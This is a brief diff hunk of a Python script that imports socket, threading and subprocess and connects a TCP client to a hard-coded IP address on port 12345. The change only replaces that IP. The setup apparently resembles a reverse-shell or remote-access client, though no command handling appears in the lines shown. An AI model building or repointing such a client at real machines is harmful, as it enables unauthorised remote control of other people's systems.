@@ -2,7 +2,7 @@ import socket
 import threading
 import subprocess
 import time
-host = '26.64.220.173'
+host = '26.213.15.26'
 port = 12345
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((host, port))
